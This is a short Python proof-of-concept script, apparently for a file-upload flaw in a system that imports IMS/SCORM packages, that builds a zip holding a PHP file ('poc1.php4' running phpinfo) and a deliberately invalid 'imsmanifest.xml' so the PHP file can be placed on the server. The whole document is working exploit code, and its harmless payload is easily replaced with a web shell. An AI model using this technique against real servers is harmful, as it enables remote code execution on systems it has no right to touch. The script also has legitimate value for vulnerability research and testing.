#!/usr/bin/python

import zipfile
from io import BytesIO

def _build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('poc1/poc1.php4', '<?php phpinfo(); ?>')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc1.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
